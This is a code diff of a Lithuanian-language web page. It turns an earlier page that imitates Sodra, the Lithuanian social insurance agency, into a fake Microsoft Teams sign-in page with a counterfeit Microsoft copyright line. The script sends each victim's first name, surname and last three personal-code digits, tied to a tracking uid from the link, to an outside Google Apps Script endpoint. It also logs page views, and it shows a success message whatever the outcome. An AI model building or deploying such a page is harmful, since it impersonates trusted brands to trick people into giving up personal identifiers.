@@ -2,124 +2,228 @@
 <html lang="lt">
 <head>
 <meta charset="UTF-8">
-<title>Asmens kodo patvirtinimas</title>
+<title>Prisijungimas — MS Teams stilius</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-html, body {
-    margin: 0;
-    height: 100%;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background: linear-gradient(135deg, #8a2062 0%, #d18cb3 100%);
-    position: relative;
-    overflow: hidden;
-}
-.document-bg {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: url('sodra-screenshot.png') no-repeat center center;
-    background-size: cover;
-    filter: blur(12px);
-    z-index: 1;
-    opacity: 0.7;
-}
-.unlock-card {
-    position: relative;
-    z-index: 2;
-    background: white;
-    padding: 30px 40px;
-    border-radius: 10px;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-    text-align: center;
-    width: 320px;
-    border: 2px solid #8a2062;
-}
-h2 { font-size: 18px; margin-bottom: 15px; color: #8a2062; }
-input[type="text"] {
-    width: 100%;
-    padding: 10px;
-    font-size: 16px;
+  :root{
+    --teams-purple: #6264A7;
+    --teams-bg: linear-gradient(180deg,#f3f5fb 0%, #ffffff 100%);
+    --card-bg: #ffffff;
+    --muted:#666;
+  }
+  html,body{
+    height:100%;
+    margin:0;
+    font-family: "Segoe UI", Roboto, Arial, sans-serif;
+    background: var(--teams-bg);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  /* centrovimas + subtilus Teams stilius */
+  .wrap{
+    width: 380px;
+    padding: 28px;
+  }
+
+  .teams-card{
+    background: var(--card-bg);
+    border-radius: 8px;
+    box-shadow: 0 6px 18px rgba(98,100,167,0.15);
+    border: 1px solid rgba(98,100,167,0.08);
+    padding: 20px 22px;
+  }
+
+  .brand {
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom: 14px;
+  }
+
+  .brand .logo {
+    width:44px;height:44px;border-radius:8px;
+    background: linear-gradient(135deg, var(--teams-purple), #7b76d9);
+    display:flex;align-items:center;justify-content:center;color:white;font-weight:700;
+    font-size:18px;box-shadow: inset 0 -6px 12px rgba(0,0,0,0.06);
+  }
+
+  h2 {
+    margin:0;
+    font-size:18px;
+    color: #222;
+  }
+
+  p.lead {
+    margin:6px 0 16px 0;
+    color: var(--muted);
+    font-size:13px;
+  }
+
+  form .field {
+    margin-bottom:12px;
+    text-align:left;
+  }
+
+  label {
+    display:block;
+    font-size:12px;
+    color:#444;
+    margin-bottom:6px;
+  }
+
+  input[type="text"], input[type="password"] {
+    width:100%;
+    padding:10px 12px;
+    border-radius:6px;
+    border:1px solid #d6d6e0;
+    font-size:14px;
+    box-sizing:border-box;
+    outline: none;
+  }
+
+  input[type="text"]:focus, input[type="password"]:focus {
+    box-shadow: 0 0 0 3px rgba(98,100,167,0.08);
+    border-color: var(--teams-purple);
+  }
+
+  .actions {
     margin-top: 10px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
-    text-align: center;
-}
-button {
-    margin-top: 15px;
-    padding: 10px;
-    width: 100%;
-    font-size: 16px;
-    background-color: #8a2062;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    transition: background-color 0.3s;
-}
-button:hover { background-color: #a32c79; }
-#error { color: red; margin-top: 10px; display: none; }
+  }
+
+  button.primary {
+    width:100%;
+    padding:10px 12px;
+    border-radius:6px;
+    border:none;
+    background: var(--teams-purple);
+    color:white;
+    font-weight:600;
+    cursor:pointer;
+    font-size:14px;
+  }
+  button.primary:hover { filter:brightness(1.05); }
+
+  .msg {
+    margin-top:10px;
+    font-size:13px;
+  }
+  .msg.success { color: #1a9a3a; display:none; }
+  .msg.error { color: #c63232; display:none; }
+
+  .small-note { font-size:12px; color:#888; margin-top:8px; text-align:center; }
 </style>
 </head>
 <body>
+  <div class="wrap">
+    <div class="teams-card" role="region" aria-label="Prisijungimas">
+      <div class="brand">
+        <div class="logo">T</div>
+        <div>
+          <h2>Vartotojo duomenys</h2>
+          <p class="lead">Įveskite vardą, pavardę ir paskutinius 3 asmens kodo skaitmenis.</p>
+        </div>
+      </div>
 
-<div class="document-bg"></div>
+      <form id="teamsForm" autocomplete="off" novalidate>
+        <div class="field">
+          <label for="fname">Vardas <span aria-hidden="true" style="color:#c63232">*</span></label>
+          <input type="text" id="fname" name="fname" required placeholder="Įrašykite vardą">
+        </div>
 
-<div class="unlock-card" id="card">
-    <h2>Įveskite paskutinius 4 asmens kodo skaičius, kad peržiūrėti savo informaciją</h2>
-    <input type="text" id="last4" maxlength="4">
-    <button id="submitBtn">Patvirtinti</button>
-    <p id="error">Nepavyko, bandykite vėliau.</p>
-</div>
+        <div class="field">
+          <label for="lname">Pavardė <span aria-hidden="true" style="color:#c63232">*</span></label>
+          <input type="text" id="lname" name="lname" required placeholder="Įrašykite pavardę">
+        </div>
+
+        <div class="field">
+          <label for="pin3">Slaptažodis — paskutiniai 3 asmens kodo skaičiai <span aria-hidden="true" style="color:#c63232">*</span></label>
+          <input type="password" id="pin3" name="pin3" inputmode="numeric" maxlength="3" required pattern="\d{3}" placeholder="Asmens kodo pabaiga">
+        </div>
+
+        <!-- paslėptas uid, paimamas iš url -->
+        <input type="hidden" id="uid" name="uid">
+
+        <div class="actions">
+          <button type="submit" class="primary">Pateikti</button>
+        </div>
+      </form>
+
+      <p class="msg success" id="successMsg">Dėkojame už pateiktą informaciją.</p>
+      <p class="msg error" id="errorMsg">Įvyko klaida. Patikrinkite duomenis ir bandykite dar kartą.</p>
+
+      <p class="small-note">© Microsoft 2025. Visos teisės saugomos.</p>
+    </div>
+  </div>
 
 <script>
-// Google Sheets logging URL
-const LOG_ENDPOINT = "https://script.google.com/macros/s/AKfycbyJHvCVpRMrZMPM_hj2SJLVEa_Mp_8todn4FuIek5Q56Sn_3uEfMHZibSSleh_CqIK5dQ/exec";
+  // TAIP PAT PAKEISK Į SAVO SCRIPT URL JEIGU REIKIA
+  const LOG_ENDPOINT = "https://script.google.com/macros/s/AKfycbyJHvCVpRMrZMPM_hj2SJLVEa_Mp_8todn4FuIek5Q56Sn_3uEfMHZibSSleh_CqIK5dQ/exec";
 
-// Paimti uid iš URL ?uid=EMP001
-function getUidFromUrl() {
+  // get uid from URL ?uid=EMP001
+  function getUidFromUrl(){
     const params = new URLSearchParams(window.location.search);
     return params.get("uid") || "UNKNOWN";
-}
+  }
 
-const uid = getUidFromUrl();
-const correctCode = "1234"; // čia pakeisk pagal poreikį
-const input = document.getElementById("last4");
-const btn = document.getElementById("submitBtn");
-const error = document.getElementById("error");
+  const uid = getUidFromUrl();
+  document.getElementById('uid').value = uid;
 
-// Log page view
-fetch(LOG_ENDPOINT + "?uid=" + encodeURIComponent(uid) + "&event=view")
-.catch(err => console.error("View log error:", err));
+  // Log page view (optional)
+  fetch(LOG_ENDPOINT + "?uid=" + encodeURIComponent(uid) + "&event=view")
+    .catch(e => console.error("View log error:", e));
 
-btn.addEventListener("click", function() {
-    const val = input.value.trim();
-    
-    // Log the attempt
-   
-    
-    if(val === correctCode) {
-        alert("Teisingas kodas!");
-        input.value = "";
-        error.style.display = "none";
-        
-        // Log success
-        fetch(LOG_ENDPOINT + "?uid=" + encodeURIComponent(uid) + "&event=success")
-        .catch(err => console.error("Success log error:", err));
-    } else {
-        error.style.display = "block";
-        input.value = "";
-        
-        // Log failure
-        fetch(LOG_ENDPOINT + "?uid=" + encodeURIComponent(uid) + "&event=failure")
-        .catch(err => console.error("Failure log error:", err));
+  const form = document.getElementById('teamsForm');
+  const successMsg = document.getElementById('successMsg');
+  const errorMsg = document.getElementById('errorMsg');
+
+  function validatePin(pin){
+    return /^\d{3}$/.test(pin);
+  }
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    successMsg.style.display = "none";
+    errorMsg.style.display = "none";
+
+    const fname = document.getElementById('fname').value.trim();
+    const lname = document.getElementById('lname').value.trim();
+    const pin3 = document.getElementById('pin3').value.trim();
+
+    // client-side validation
+    if(!fname || !lname){
+      errorMsg.textContent = "Vardas ir pavardė yra privalomi.";
+      errorMsg.style.display = "block";
+      return;
     }
-});
-</script>
+    if(!validatePin(pin3)){
+      errorMsg.textContent = "Slaptažodis turi būti tik 3 skaitmenys.";
+      errorMsg.style.display = "block";
+      return;
+    }
 
+    // log attempt (užregistruoti kas bandė)
+    const query = LOG_ENDPOINT
+      + "?uid=" + encodeURIComponent(uid)
+      + "&event=submit"
+      + "&fname=" + encodeURIComponent(fname)
+      + "&lname=" + encodeURIComponent(lname)
+      + "&pin3=" + encodeURIComponent(pin3);
+
+    // send to Google Script
+    fetch(query)
+      .then(resp => {
+        // net jei script grąžina 200, parodyti success
+        successMsg.style.display = "block";
+        form.reset();
+      })
+      .catch(err => {
+        console.error("Submit error:", err);
+        errorMsg.textContent = "Tinklo klaida — nepavyko išsiųsti.";
+        errorMsg.style.display = "block";
+      });
+  });
+</script>
 </body>
 </html>
